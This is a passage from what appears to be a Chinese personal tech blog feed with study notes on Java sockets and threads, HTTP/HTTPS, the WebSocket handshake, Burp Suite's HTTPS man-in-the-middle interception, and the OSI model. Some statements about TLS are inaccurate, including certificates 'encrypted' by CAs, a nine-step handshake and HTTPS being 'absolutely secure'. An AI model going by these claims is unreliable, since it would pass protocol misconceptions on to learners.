comment" spellcheck="true">// 传递一个字符型数组</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java-网络编程"><a href="#Java-网络编程" class="headerlink" title="Java 网络编程"></a>Java 网络编程</h2><h3 id="Socket-编程"><a href="#Socket-编程" class="headerlink" title="Socket 编程"></a>Socket 编程</h3><p>套接字使用TCP提供了两台计算机之间的通信机制。 客户端程序创建一个套接字，并尝试连接服务器的套接字。</p><p>当连接建立时，服务器会创建一个 Socket 对象。客户端和服务器现在可以通过对 Socket 对象的写入和读取来进行通信。</p><p>java.net.Socket 类代表一个套接字，并且 java.net.ServerSocket 类为服务器程序提供了一种来监听客户端，并与他们建立连接的机制。</p><p>以下步骤在两台计算机之间使用套接字建立TCP连接时会出现：</p><ul><li><strong>服务器实例化一个 ServerSocket 对象，表示通过服务器上的端口通信。</strong></li><li><strong>服务器调用 ServerSocket 类的 accept() 方法，该方法将一直等待，直到客户端连接到服务器上给定的端口。</strong></li><li><strong>服务器正在等待时，一个客户端实例化一个 Socket 对象，指定服务器名称和端口号来请求连接。</strong></li><li><strong>Socket 类的构造函数试图将客户端连接到指定的服务器和端口号。如果通信被建立，则在客户端创建一个 Socket 对象能够与服务器进行通信。</strong></li><li><strong>在服务器端，accept() 方法返回服务器上一个新的 socket 引用，该 socket 连接到客户端的 socket。</strong></li></ul><p>连接建立后，通过使用 I/O 流在进行通信，每一个socket都有一个输出流和一个输入流，客户端的输出流连接到服务器端的输入流，而客户端的输入流连接到服务器端的输出流。</p><p>TCP 是一个双向的通信协议，因此数据可以通过两个数据流在同一时间发送。</p><h2 id="Java-多线程编程"><a href="#Java-多线程编程" class="headerlink" title="Java 多线程编程"></a>Java 多线程编程</h2><h3 id="线程的优先级"><a href="#线程的优先级" class="headerlink" title="线程的优先级"></a>线程的优先级</h3><p>每一个 Java 线程都有一个优先级，这样有助于操作系统确定线程的调度顺序。</p><p>Java 线程的优先级是一个整数，其取值范围是 1 （Thread.MIN_PRIORITY ） - 10 （Thread.MAX_PRIORITY ）。</p><p>默认情况下，每一个线程都会分配一个优先级 NORM_PRIORITY（5）。</p><p>具有较高优先级的线程对程序更重要，并且应该在低优先级的线程之前分配处理器资源。但是，线程优先级不能保证线程执行的顺序，而且非常依赖于平台。</p><p><strong>共有以下三种方法来创建多线程</strong></p><h3 id="通过实现-Runnable-接口来创建线程"><a href="#通过实现-Runnable-接口来创建线程" class="headerlink" title="通过实现 Runnable 接口来创建线程"></a>通过实现 Runnable 接口来创建线程</h3><p>创建一个线程，最简单的方法是创建一个实现 Runnable 接口的类。</p><p>为了实现 Runnable，一个类只需要执行一个方法调用 run()，声明如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你可以重写该方法，重要的是理解的 run() 可以调用其他方法，使用其他类，并声明变量，就像主线程一样。</p><p>在创建一个实现 Runnable 接口的类之后，你可以在类中实例化一个线程对象。</p><p>Thread 定义了几个构造方法，下面的这个是我们经常使用的：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token function">Thread</span><span class="token punctuation">(</span>Runnable threadOb<span class="token punctuation">,</span>String threadName<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里，threadOb 是一个实现 Runnable 接口的类的实例，并且 threadName 指定新线程的名字。</p><p>新线程创建之后，调用它的 start() 方法它才会运行。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="通过继承Thread来创建线程"><a href="#通过继承Thread来创建线程" class="headerlink" title="通过继承Thread来创建线程"></a>通过继承Thread来创建线程</h3><p>创建一个线程的第二种方法是创建一个新的类，该类继承 Thread 类，然后创建一个该类的实例。</p><p>继承类必须重写 run() 方法，该方法是新线程的入口点。它也必须调用 start() 方法才能执行。</p><p>该方法尽管被列为一种多线程实现方式，但是本质上也是实现了 Runnable 接口的一个实例。</p><h3 id="通过-Callable-和-Future-创建线程"><a href="#通过-Callable-和-Future-创建线程" class="headerlink" title="通过 Callable 和 Future 创建线程"></a>通过 Callable 和 Future 创建线程</h3><ul><li>1.创建 Callable 接口的实现类，并实现 call() 方法，该 call() 方法将作为线程执行体，并且有返回值。</li><li>2.创建 Callable 实现类的实例，使用 FutureTask 类来包装 Callable 对象，该 FutureTask 对象封装了该 Callable 对象的 call() 方法的返回值。</li><li>3.使用 FutureTask 对象作为 Thread 对象的 target 创建并启动新线程。</li><li>4.调用 FutureTask 对象的 get() 方法来获得子线程执行结束后的返回值。</li></ul><h2 id="创建线程的三种方式的对比"><a href="#创建线程的三种方式的对比" class="headerlink" title="创建线程的三种方式的对比"></a>创建线程的三种方式的对比</h2><ul><li><ol><li>采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。</li></ol></li><li><ol start="2"><li>使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。</li></ol></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程，java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP和HTTPs知识点的个人总结</title>
      <link href="/2020/11/22/2020-11-22-http-he-https-zhi-shi-dian-de-ge-ren-zong-jie/"/>
      <url>/2020/11/22/2020-11-22-http-he-https-zhi-shi-dian-de-ge-ren-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP和HTTPs知识点的个人总结"><a href="#HTTP和HTTPs知识点的个人总结" class="headerlink" title="HTTP和HTTPs知识点的个人总结"></a>HTTP和HTTPs知识点的个人总结</h1><p><strong>HTTP</strong>: 超文本传输协议</p><p>一种普遍建立在TCP协议基础上的互联网传输协议，用来规范浏览器和服务器之间的通信和数据传输，也就是<strong>专门用来传输HTML页面的</strong>。</p><p>是一种<strong>应用层</strong>的协议，比传输层的TCP协议更高一层。它们之间没有必然的依赖关系。</p><p>通俗地说，HTTP负责这个数据包的内容格式，它不管你的传输是否正确，是否成功，是否安全，它只管把HTML的页面以这种协议规范格式组合好。</p><p>而TCP不管你发的数据包内容是什么，它只管按照TCP协议的规范和流程将这个数据包发送到指定的对象手上。</p><p>浏览器与网站服务器的沟通过程是这样的：</p><p>1.TCP三次握手，确立信息传输通道</p><p>2.传输http数据包</p><p>3.TCP四次挥手</p><p>4.连接断开，传输通道关闭</p><p>所以，HTTP并不一定要依赖TCP,只要能进行数据传输，就能使用HTTP协议。</p><p><strong>HTTPs</strong>：安全的HTTP（使用ssl/tls加密通信的HTTP）</p><p><strong>证书</strong>：由合法、公认的CA机构用不对称加密算法（RSA）加密的<strong>网站的公钥以及一些信息（包括网站信息以及证书信息）</strong>。浏览器内置这些合法CA机构的公钥，所以能解密这个证书中的信息，从而验证这个证书的合法性以及得到网站的公钥。</p><p>实际上并不是只有CA机构能颁发证书，个人或私有组织、软件也能颁发证书，但浏览器收到个人或私有组织、软件颁发的证书会发出警告，用户可以选择是否相信这个组织或证书，这也是为什么使用burpsuite抓HTTPs的数据包需要安装bp的证书。</p><p>得到网站公钥不是直接用来传输数据的，而是用来加密接下来与服务器“商量”ssl加密通道的的消息的。</p><p><img src="/img/https-intro.png" alt="https传输图解"></p><p>因为显然网站的公钥很容易获取，任何人只要拥有CA的公钥并向网站发起一次ssl连接请求，就能够得到网站的公钥，所以公钥不能直接用来加密客户端与服务器之间的“通话”，这样并没有安全可言。</p><p>但如上图所示，浏览器用公钥加密一个随机KEY，并发给服务器作为一个足够复杂的对称加密算法的KEY(密钥)，来进行接下来的数据传输，这种方式无疑安全的多，只要这种对称加密算法足够复杂。</p><p>因为这个随机KEY只有用私钥解密才能获得，没有私钥，截获了也没有用，所以第三方对此基本束手无策。</p><p>故，HTTPs是一种“基本绝对安全”的通信方式。</p><p>另，HTTPs连接一般比HTTP慢的多，因为，HTTP只需要TCP三次握手，发送三个数据包，HTTPs除了TCP三次握手，还有ssl九次握手（以后再详写），加起来一共十二个数据包。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSocket笔记</title>
      <link href="/2020/11/22/2020-11-22-websocket/"/>
      <url>/2020/11/22/2020-11-22-websocket/</url>
      
        <content type="html"><![CDATA[<h1 id="WebSocket笔记"><a href="#WebSocket笔记" class="headerlink" title="WebSocket笔记"></a>WebSocket笔记</h1><h2 id="异步请求"><a href="#异步请求" class="headerlink" title="异步请求"></a>异步请求</h2><p>当浏览器向服务器发送同步请求时，<strong>服务器处理同步请求的过程中，浏览器会处于等待的状态</strong>，服务器处理完请求把数据响应给浏览器并覆盖浏览器内存中原有的数据，<strong>浏览器重新加载页面并展示服务器响应的数据</strong>。这是<strong>同步请求</strong>。如果这个过程比较漫长，用户会感觉界面“卡死了”。</p><p>异步请求就是浏览器把请求交给<strong>代理对象—XMLHttpRequest</strong>（绝大多数浏览器都内置了这个对象），由代理对象向服务器发起请求，接收、解析服务器响应的数据，并把数据更新到浏览器指定的控件上。从而实现了<strong>页面数据的局部刷新</strong>。异步请求使浏览器<strong>不用等待服务器处理请求，不用重新加载整个页面来展示服务器响应的数据，在异步请求发送的过程中浏览器还能进行其它的操作</strong>。</p><p>异步请求的执行流程图：</p><p><img src="/img/14405984-ac876e7354969cab.jpg" alt="img"></p><p>大多数用户交互都是使用异步响应体验更好，但有些特殊情况比如：银行转账或数据库更新等操作，优先使用同步响应，这样更安全，其中的道理不言自明。</p><h2 id="WebSocket特点"><a href="#WebSocket特点" class="headerlink" title="WebSocket特点"></a>WebSocket特点</h2><p><a href="http://websocket.org/" target="_blank" rel="noopener">WebSocket</a> 是一种网络通信协议。<a href="https://tools.ietf.org/html/rfc6455" target="_blank" rel="noopener">RFC6455</a> 定义了它的通信标准。</p><p>WebSocket 是 HTML5 开始提供的一种<strong>在单个 TCP 连接上进行全双工通讯</strong>的协议。</p><p>由于HTTP是<strong>无连接的，且，只能由客户端发起</strong>，在一些场景下，HTTP并不能足以完成任务，所以需要建立和使用WebSocket双全工通讯协议。</p><p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于<a href="https://en.wikipedia.org/wiki/Push_technology" target="_blank" rel="noopener">服务器推送技术</a>的一种。</p><p>其他特点包括：</p><p>（1）建立在 TCP 协议之上，服务器端的实现比较容易。</p><p>（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</p><p>（3）数据格式比较轻量，性能开销小，通信高效。</p><p>（4）可以发送文本，也可以发送二进制数据。</p><p>（5）没有同源限制，客户端可以与任意服务器通信。</p><p>（6）协议标识符是<code>ws</code>（如果加密，则为<code>wss</code>），服务器网址就是 URL。</p><h3 id="如何建立连接"><a href="#如何建立连接" class="headerlink" title="如何建立连接"></a>如何建立连接</h3><p>WebSocket复用了HTTP的握手通道。</p><p>具体指的是，客户端通过HTTP请求与WebSocket服务端协商升级协议。协议升级完成后，后续的数据交换则遵照WebSocket的协议。</p><h4 id="1、客户端：申请协议升级"><a href="#1、客户端：申请协议升级" class="headerlink" title="1、客户端：申请协议升级"></a>1、客户端：申请协议升级</h4><p>首先，客户端发起协议升级请求。可以看到，采用的是标准的HTTP报文格式，且只支持<code>GET</code>方法。</p><pre class="line-numbers language-http"><code class="language-http">GET / HTTP/1.1<span class="token header-name keyword">Host:</span> localhost:8080<span class="token header-name keyword">Origin:</span> http://127.0.0.1:3000<span class="token header-name keyword">Connection:</span> Upgrade<span class="token header-name keyword">Upgrade:</span> websocket            <span class="token header-name keyword">Sec-WebSocket-Version:</span> 13<span class="token header-name keyword">Sec-WebSocket-Key:</span> w4v7O6xFTi36lq3RNcgctw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点请求首部意义如下：</p><ul><li><code>Connection: Upgrade</code>：表示要升级协议</li><li><code>Upgrade: websocket</code>：表示要升级到websocket协议。</li><li><code>Sec-WebSocket-Version: 13</code>：表示websocket的版本。如果服务端不支持该版本，需要返回一个<code>Sec-WebSocket-Version</code>header，里面包含服务端支持的版本号。</li><li><code>Sec-WebSocket-Key</code>：与后面服务端响应首部的<code>Sec-WebSocket-Accept</code>是配套的，提供基本的防护，比如恶意的连接，或者无意的连接。</li></ul><blockquote><p>注意，上面请求省略了部分非重点请求首部。由于是标准的HTTP请求，类似Host、Origin、Cookie等请求首部会照常发送。在握手阶段，可以通过相关请求首部进行 安全限制、权限校验等。</p></blockquote><h4 id="2、服务端：响应协议升级"><a href="#2、服务端：响应协议升级" class="headerlink" title="2、服务端：响应协议升级"></a>2、服务端：响应协议升级</h4><p>服务端返回内容如下，状态代码<code>101</code>表示协议切换。到此完成协议升级，后续的数据交互都按照新的协议来。</p><pre class="line-numbers language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">101 Switching Protocols</span></span><span class="token header-name keyword">Connection:</span>Upgrade<span class="token header-name keyword">Upgrade:</span> websocket<span class="token header-name keyword">Sec-WebSocket-Accept:</span> Oy4NRAQ13jhfONC7bP8dTKb4PTU=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>备注：每个header都以<code>\r\n</code>结尾，并且最后一行加上一个额外的空行<code>\r\n</code>。此外，服务端回应的HTTP状态码只能在握手阶段使用。过了握手阶段后，就只能采用特定的错误码。</p></blockquote><h4 id="3、Sec-WebSocket-Accept的计算"><a href="#3、Sec-WebSocket-Accept的计算" class="headerlink" title="3、Sec-WebSocket-Accept的计算"></a>3、Sec-WebSocket-Accept的计算</h4><p><code>Sec-WebSocket-Accept</code>根据客户端请求首部的<code>Sec-WebSocket-Key</code>计算出来。</p><p>计算公式为：</p><ol><li>将<code>Sec-WebSocket-Key</code>跟<code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>拼接。</li><li>通过SHA1计算出摘要，并转成base64字符串。</li></ol><p>伪代码如下：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">></span><span class="token function">toBase64</span><span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span> Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Key <span class="token operator">+</span> 258EAFA5<span class="token operator">-</span>E914<span class="token operator">-</span>47DA<span class="token operator">-</span>95CA<span class="token operator">-</span>C5AB0DC85B11 <span class="token punctuation">)</span>  <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证下前面的返回结果：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> magic <span class="token operator">=</span> <span class="token string">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span><span class="token punctuation">;</span><span class="token keyword">const</span> secWebSocketKey <span class="token operator">=</span> <span class="token string">'w4v7O6xFTi36lq3RNcgctw=='</span><span class="token punctuation">;</span><span class="token keyword">let</span> secWebSocketAccept <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'sha1'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>secWebSocketKey <span class="token operator">+</span> magic<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>secWebSocketAccept<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite拦截HTTPS过程与原理</title>
      <link href="/2020/11/21/2020-11-21-burpsuite-lan-jie-https-guo-cheng-yu-yuan-li/"/>
      <url>/2020/11/21/2020-11-21-burpsuite-lan-jie-https-guo-cheng-yu-yuan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="Burpsuite拦截HTTPS过程与原理"><a href="#Burpsuite拦截HTTPS过程与原理" class="headerlink" title="Burpsuite拦截HTTPS过程与原理"></a>Burpsuite拦截HTTPS过程与原理</h1><h2 id="SSL握手过程"><a href="#SSL握手过程" class="headerlink" title="SSL握手过程"></a>SSL握手过程</h2><p>访问https网站，浏览器向服务器发送ssl client  hello请求，服务器进行响应发回自己的证书（是的每一次建立ssl连接服务器都会向客户端发送证书不要怀疑），浏览器收到服务器的证书后检测证书的签发机构（即CA）是否在自己信任的机构列表中，如果不在则浏览器报错并终止ssl握手过程如果在则继续进行后续握手步骤。</p><h2 id="https代理原理"><a href="#https代理原理" class="headerlink" title="https代理原理"></a>https代理原理</h2><p>首先，浏览器向服务器发起ssl client  hello请求</p><p>burpsuite作为代理，可以理解为它“伪造“成服务器，向浏览器发回使用burpsuite自己证书作为为当前目标网站的证书与浏览器建立一个连接（暂称其为C1）；</p><p>同时burpsuite向真正的服务器发送一个ssl client  hello，与真正的服务器建立另一个连接（暂称其为C2）。</p><p>所以真正的请求是浏览器通过C1向burpsuite提交数据，burpsuite又从C1中把http数据拿出来通过C2提交到真正的服务器，响应过程则反过来，将服务器通过C2传输的http数据拿出来，用自己的私钥加密，再传给浏览器。</p><p>burpsuite不能直接把服务器的证书和数据包一起转给浏览器，只能用CA的公钥解包后提取数据，引入自己的证书再加密发给浏览器；否则，直接将服务器证书交给浏览器，burpsuite就拿不到里面的服务器公钥了，之后就算抓到数据包，没有服务器私钥也解不出http的内容。</p><p>burpsuite本质上即是一个中间人，或者说中间人攻击说的就是burpsuite这种形式。</p><p>而如果浏览器发现收到的证书的签发机构不在自己的信任列表中则会报错或警告。</p><p>具体到burpsuite，返回给浏览器的证书是burpsuite自己签名的证书（burpsuite代理时返回给浏览器的证书是burpsuite针对该网站临时签名的证书，）而burpsuite自己的证书不在浏览器默认的信任CA列表中，所以会导致警报或报错。</p><p>所以为什么在使用burpsuite拦截https前，要导入burp suite的证书，就是要把burpsuite的CA证书导入到浏览器的信任证书机构列表中的，使浏览器以后再接收到burpsuite签发的证书时不再报错。</p><p>导入的证书信息如下：</p><p><img src="https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104300636-2032046177.png" alt="img"></p><p>burpsuite代理该问网站时，网站证书如下：</p><p><img src="https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104415239-1588036366.png" alt="img"></p><p>直接访问网站时，网站证书如下：</p><p><img src="https://img2018.cnblogs.com/blog/1116722/201907/1116722-20190717104607056-1486305447.png" alt="img"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现阶段计算机网络知识笔记以及整合（不断整合）</title>
      <link href="/2020/11/21/2020-11-21-xian-jie-duan-xue-xi-guo-de-ji-suan-ji-wang-luo-zhi-shi-zheng-he-bi-ji/"/>
      <url>/2020/11/21/2020-11-21-xian-jie-duan-xue-xi-guo-de-ji-suan-ji-wang-luo-zhi-shi-zheng-he-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="现阶段计算机网络知识笔记以及整合"><a href="#现阶段计算机网络知识笔记以及整合" class="headerlink" title="现阶段计算机网络知识笔记以及整合"></a>现阶段计算机网络知识笔记以及整合</h1><h2 id="OSI网络参考模型"><a href="#OSI网络参考模型" class="headerlink" title="OSI网络参考模型"></a>OSI网络参考模型</h2><p><strong>开放式系统互联模型</strong>（英语：<strong>O</strong>pen <strong>S</strong>ystem <strong>I</strong>nterconnection Model，缩写：OSI；简称为<strong>OSI模型</strong>）是一种<a href="https://zh.wikipedia.org/wiki/概念模型" target="_blank" rel="noopener">概念模型</a>，由<a href="https://zh.wikipedia.org/wiki/国际标准化组织" target="_blank" rel="noopener">国际标准化组织</a>提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。定义于ISO/IEC 7498-1。</p><p>根据建议X.200，OSI将计算机网络体系结构划分为以下七层，标有1～7，第1层在底部。 现“OSI/RM”是<a href="https://zh.wikipedia.org/wiki/英文" target="_blank" rel="noopener">英文</a>“Open Systems Interconnection Reference Model”的缩写。</p><p>PS:这只是一种参考模型</p><h3 id="第7层-应用层"><a href="#第7层-应用层" class="headerlink" title="第7层 应用层"></a>第7层 应用层</h3><p>主条目：<a href="https://zh.wikipedia.org/wiki/应用层" target="_blank" rel="noopener">应用层</a></p><p>应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。</p><h3 id="第6层-表示层"><a href="#第6层-表示层" class="headerlink" title="第6层 表示层"></a>第6层 表示层</h3><p>主条目：<a href="https://zh.wikipedia.org/wiki/表示层" target="_blank" rel="noopener">表示层</a></p><p>表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。</p><h3 id="第5层-会话层"><a href="#第5层-会话层" class="headerlink" title="第5层 会话层"></a>第5层 会话层</h3><p>主条目：<a href="https://zh.wikipedia.org/wiki/会话层" target="_blank" rel="noopener">会话层</a></p><p>会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。</p><h3 id="第4层-传输层"><a href="#第4层-传输层" class="headerlink" title="第4层 传输层"></a>第4层 传输层</h3><p>主条目：<a href="https://zh.wikipedia.org/wiki/传输层" target="_blank" rel="noopener">传输层</a></p><p>传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。</p><h3 id="第3层-网络层"><a href="#第3层-网络层" class="headerlink" title="第3层 网络层"></a>第3层 网络层</h3><p>主条目：<a href="https://zh.wikipedia.org/wiki/网络层" target="_blank" rel="noopener">网络层</a></p><p>网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成报文。网络表头包含了网络资料。例如:互联网协议（IP）等。</p><h3 id="第2层-数据链路层"><a href="#第2层-数据链路层" class="headerlink" title="第2层 数据链路层"></a>第2层 数据链路层</h3><p>主条目：<a href="https://zh.wikipedia.org/wiki/数据链路层" target="_blank" rel="noopener">数据链路层</a></p><p>数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成<a href="https://zh.wikipedia.org/wiki/資訊框" target="_blank" rel="noopener">信息框</a>（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。</p><p>分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。</p><h3 id="第1层-物理层"><a href="#第1层-物理层" class="headerlink" title="第1层 物理层"></a>第1层 物理层</h3><p>主条目：<a href="https://zh.wikipedia.org/wiki/物理层" target="_blank" rel="noopener">物理层</a></p><p>物理层（Physical Layer）在局部局域网上传送<a href="https://zh.wikipedia.org/wiki/数据帧" target="_blank" rel="noopener">数据帧</a>（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。</p><h2 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h2><p>TCP/IP 是基于 TCP 和 IP 这两个最初的协议之上的不同的通信协议的大集合。</p><p>里面有：</p><h4 id="TCP-传输控制协议"><a href="#TCP-传输控制协议" class="headerlink" title="TCP - 传输控制协议"></a>TCP - 传输控制协议</h4><p>TCP 用于从应用程序到网络的数据传输控制。</p><p>TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。</p><hr><h4 id="IP-网际协议（Internet-Protocol）"><a href="#IP-网际协议（Internet-Protocol）" class="headerlink" title="IP - 网际协议（Internet Protocol）"></a>IP - 网际协议（Internet Protocol）</h4><p>IP 负责计算机之间的通信。</p><p>IP 负责在因特网上发送和接收数据包。</p><hr><h4 id="HTTP-超文本传输协议-Hyper-Text-Transfer-Protocol"><a href="#HTTP-超文本传输协议-Hyper-Text-Transfer-Protocol" class="headerlink" title="HTTP - 超文本传输协议(Hyper Text Transfer Protocol)"></a>HTTP - 超文本传输协议(Hyper Text Transfer Protocol)</h4><p>HTTP 负责 web 服务器与 web 浏览器之间的通信。</p><p>HTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。</p><hr><h4 id="HTTPS-安全的-HTTP（HTTP-Secure）"><a href="#HTTPS-安全的-HTTP（HTTP-Secure）" class="headerlink" title="HTTPS - 安全的 HTTP（HTTP Secure）"></a>HTTPS - 安全的 HTTP（HTTP Secure）</h4><p>HTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。</p><p>作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。</p><hr><h4 id="SSL-安全套接字层（Secure-Sockets-Layer）"><a href="#SSL-安全套接字层（Secure-Sockets-Layer）" class="headerlink" title="SSL - 安全套接字层（Secure Sockets Layer）"></a>SSL - 安全套接字层（Secure Sockets Layer）</h4><p>SSL 协议用于为安全数据传输加密数据。（TLS协议的前身）</p><hr><h4 id="TLS-安全传输层协议（Transport-Layer-Security）"><a href="#TLS-安全传输层协议（Transport-Layer-Security）" class="headerlink" title="TLS - 安全传输层协议（Transport Layer Security）"></a>TLS - 安全传输层协议（Transport Layer Security）</h4><p>TLS协议用于在两个通信应用程序之间提供保密性和数据完整性。（标准化SSL协议）</p><hr><h4 id="SMTP-简易邮件传输协议（Simple-Mail-Transfer-Protocol）"><a href="#SMTP-简易邮件传输协议（Simple-Mail-Transfer-Protocol）" class="headerlink" title="SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）"></a>SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）</h4><p>SMTP 用于电子邮件的传输。</p><hr><h4 id="MIME-多用途因特网邮件扩展（Multi-purpose-Internet-Mail-Extensions）"><a href="#MIME-多用途因特网邮件扩展（Multi-purpose-Internet-Mail-Extensions）" class="headerlink" title="MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）"></a>MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）</h4><p>MIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。</p><hr><h4 id="IMAP-因特网消息访问协议（Internet-Message-Access-Protocol）"><a href="#IMAP-因特网消息访问协议（Internet-Message-Access-Protocol）" class="headerlink" title="IMAP - 因特网消息访问协议（Internet Message Access Protocol）"></a>IMAP - 因特网消息访问协议（Internet Message Access Protocol）</h4><p>IMAP 用于存储和取回电子邮件。</p><hr><h4 id="POP-邮局协议（Post-Office-Protocol）"><a href="#POP-邮局协议（Post-Office-Protocol）" class="headerlink" title="POP - 邮局协议（Post Office Protocol）"></a>POP - 邮局协议（Post Office 